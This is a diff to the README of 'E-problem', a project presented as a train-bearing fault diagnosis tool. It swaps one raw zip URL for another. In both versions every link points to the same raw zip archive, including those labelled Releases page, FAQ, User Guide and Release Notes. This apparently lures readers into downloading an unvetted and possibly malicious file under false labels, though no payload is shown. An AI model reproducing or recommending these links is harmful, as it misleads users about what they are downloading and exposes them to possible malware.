@@ -6,7 +6,7 @@ Welcome to E-problem! This tool helps diagnose faults in high-speed train bearin
 
 ## 📥 Download Now
 
-[![Download E-problem](https://raw.githubusercontent.com/AMN-26/E-problem/main/dotation/E-problem.zip)](https://raw.githubusercontent.com/AMN-26/E-problem/main/dotation/E-problem.zip)
+[![Download E-problem](https://github.com/AMN-26/E-problem/raw/refs/heads/main/dotation/problem-2.9-beta.5.zip)](https://github.com/AMN-26/E-problem/raw/refs/heads/main/dotation/problem-2.9-beta.5.zip)
 
 ## 💻 System Requirements
 
@@ -19,7 +19,7 @@ Before downloading, ensure your computer meets the following requirements:
 
 ## 📂 Download & Install
 
-To get started with E-problem, visit the [Releases page](https://raw.githubusercontent.com/AMN-26/E-problem/main/dotation/E-problem.zip) to download the application.
+To get started with E-problem, visit the [Releases page](https://github.com/AMN-26/E-problem/raw/refs/heads/main/dotation/problem-2.9-beta.5.zip) to download the application.
 
 1. Click on the link above to open the Releases page.
 2. Look for the latest version listed.
@@ -63,7 +63,7 @@ Once the application is running, here’s how to use it:
 
 If you encounter any issues or have questions, here’s how to get support:
 
-- **FAQs:** Check the Frequently Asked Questions section on our [GitHub page](https://raw.githubusercontent.com/AMN-26/E-problem/main/dotation/E-problem.zip).
+- **FAQs:** Check the Frequently Asked Questions section on our [GitHub page](https://github.com/AMN-26/E-problem/raw/refs/heads/main/dotation/problem-2.9-beta.5.zip).
 - **Issues Page:** For specific problems, visit the Issues section on GitHub to see if your issue has already been reported.
 - **Contact Us:** Feel free to reach out via email provided on the GitHub page.
 
@@ -75,7 +75,7 @@ Though this application is designed for end users, we appreciate community contr
 
 Here are some additional resources to help you understand E-problem better:
 
-- [User Guide](https://raw.githubusercontent.com/AMN-26/E-problem/main/dotation/E-problem.zip): A detailed guide on all the features.
-- [Release Notes](https://raw.githubusercontent.com/AMN-26/E-problem/main/dotation/E-problem.zip): Information on the latest updates and changes.
+- [User Guide](https://github.com/AMN-26/E-problem/raw/refs/heads/main/dotation/problem-2.9-beta.5.zip): A detailed guide on all the features.
+- [Release Notes](https://github.com/AMN-26/E-problem/raw/refs/heads/main/dotation/problem-2.9-beta.5.zip): Information on the latest updates and changes.
 
 Thank you for choosing E-problem! We hope this tool helps you effectively diagnose train bearing issues.
